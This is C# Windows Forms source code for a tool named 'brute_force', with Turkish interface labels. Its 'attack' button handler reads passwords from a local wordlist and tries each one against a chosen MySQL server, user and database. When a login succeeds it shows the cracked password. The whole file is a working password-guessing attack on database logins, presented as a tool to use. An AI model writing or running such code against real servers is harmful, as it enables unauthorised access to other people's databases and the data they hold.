﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using MySql.Data.MySqlClient;

namespace brute_force
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void button_saldir_Click(object sender, EventArgs e)
        {
            string cs;
            string serverName = textBox_server.Text;
            string userName = textBox_user.Text;
            string dbName = textBox_db.Text;
            string password1;
            int i, count;

           
            count = Convert.ToInt32(textBox_sayac.Text);

            System.IO.StreamReader sr = new System.IO.StreamReader(@"C:\Users\utku_\source\repos\brute_force\brute_force\parola.txt");
            listView1.Items.Clear();
            for (i = 0; i < count; i++)
            {
                password1 = sr.ReadLine();
                label_parola.Text = password1;
                listView1.Items.Add(password1);
                Update();

                cs = "server=" + serverName + ";user =" + userName + ";database = " + dbName + ";port =" + 3306 + ";password =" +password1;
                try
                {
                    MySqlConnection conn = new MySqlConnection(cs);
                    conn.Open();
            if (conn.State == ConnectionState.Open)
                    {
                        label_parola.Text = "Tebrikler! Parola -->  " + password1;
                        break;
                    }
                    else
                    {
                        label_parola.Text = "Bulunamadı";

                    }
                }
                catch (Exception)
                {

                }


            }

        }

        private void label4_Click(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void textBox_sayac_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
